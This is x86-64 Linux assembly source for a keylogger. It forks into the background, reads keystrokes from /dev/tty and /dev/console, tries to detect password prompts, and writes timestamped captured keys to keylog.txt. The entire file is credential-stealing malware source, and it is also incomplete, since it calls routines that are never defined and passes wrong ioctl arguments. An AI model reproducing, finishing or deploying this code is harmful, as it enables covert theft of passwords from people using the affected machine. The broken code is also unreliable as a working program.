section .data
    fname db "keylog.txt", 0
    tty_path db "/dev/tty", 0   
    console_path db "/dev/console", 0  
    ctrl_file db "k.ctrl", 0     
    fd dq 0                    
    tty_fd dq 0                
    console_fd dq 0            
    ctrl_fd dq 0               
    tbuf db 64 dup(0)          
    nl db 0xa                  
    s db " | ", 0              
    dpid dq 0                  
    detecting_password db 0    

section .bss
    buf resb 1                 
    tspec resq 2               
    termios resb 60            
    last_chars resb 10        

section .text
global _start

_start:
    mov rax, 57            
    syscall
    
    cmp rax, 0
    je child              
    mov [dpid], rax      
    jmp parent           

child:
    mov rax, 2            
    mov rdi, fname
    mov rsi, 102o        
    mov rdx, 0644o       
    syscall
    mov [fd], rax

    mov rax, 2
    mov rdi, tty_path
    mov rsi, 2           
    mov rdx, 0
    syscall
    mov [tty_fd], rax

    mov rax, 2
    mov rdi, console_path
    mov rsi, 2           
    mov rdx, 0
    syscall
    mov [console_fd], rax

    mov rax, 16          
    mov rdi, [tty_fd]
    mov rsi, termios
    syscall

    mov byte [termios+3], 0   
    mov byte [termios+6], 1   
    mov byte [termios+7], 0   

    mov rax, 16          
    mov rdi, [tty_fd]
    mov rsi, 2           
    mov rdx, termios
    syscall

    mov rax, 2
    mov rdi, ctrl_file
    mov rsi, 102o
    mov rdx, 0644o
    syscall
    mov [ctrl_fd], rax

loop:
    mov rax, 0
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    cmp rax, 1           
    je exit

    mov rax, 228         
    mov rdi, 0           
    mov rsi, tspec
    syscall

    mov byte [buf], 0

    ; Lire depuis /dev/tty
    mov rax, 0                
    mov rdi, [tty_fd]                
    mov rsi, buf
    mov rdx, 1                
    syscall

    cmp rax, 1
    jne check_console

    jmp process_key

check_console:
    ; Lire depuis /dev/console
    mov byte [buf], 0
    mov rax, 0
    mov rdi, [console_fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    cmp rax, 1
    jne loop

process_key:
    mov rsi, last_chars       
    mov rcx, 9                
    rep movsb                 
    mov [last_chars+9], al    

    call check_password_prompt
    cmp byte [detecting_password], 1
    jne loop

    mov rax, [tspec]
    mov rdi, tbuf
    call ft

    mov rax, 1                
    mov rdi, [fd]
    mov rsi, tbuf
    mov rdx, 20              
    syscall

    mov rax, 1
    mov rdi, [fd]
    mov rsi, s
    mov rdx, 3
    syscall

    mov rax, 1                
    mov rdi, [fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    mov rax, 1
    mov rdi, [fd]
    mov rsi, nl
    mov rdx, 1
    syscall

    jmp loop

parent:
    mov rax, 2            
    mov rdi, ctrl_file
    mov rsi, 102o        
    mov rdx, 0644o       
    syscall

    mov rax, 60              
    xor rdi, rdi
    syscall

exit:
    mov byte [termios+3], 11  
    mov rax, 16               
    mov rdi, [tty_fd]
    mov rsi, 2                
    mov rdx, termios
    syscall

    mov rax, 3                
    mov rdi, [fd]
    syscall

    mov rax, 3                
    mov rdi, [tty_fd]
    syscall

    mov rax, 3
    mov rdi, [console_fd]
    syscall

    mov rax, 3
    mov rdi, [ctrl_fd]
    syscall

    mov rax, 87               
    mov rdi, ctrl_file
    syscall

    mov rax, 60               
    xor rdi, rdi
    syscall